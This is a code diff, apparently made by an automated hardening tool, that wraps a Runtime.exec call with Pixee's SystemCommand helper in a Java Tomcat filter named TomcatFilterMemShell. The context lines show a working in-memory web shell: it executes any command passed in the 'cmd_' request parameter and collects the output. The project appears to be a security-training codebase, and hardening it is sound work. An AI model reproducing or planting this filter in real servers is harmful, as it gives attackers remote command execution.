@@ -1,5 +1,6 @@
 package org.joychou.config;
 
+import io.github.pixee.security.SystemCommand;
 import java.lang.reflect.Field;
 import org.apache.catalina.core.StandardContext;
 import java.io.IOException;
@@ -79,7 +80,7 @@ public class TomcatFilterMemShell implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            Process process = SystemCommand.runCommand(Runtime.getRuntime(), cmd);
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
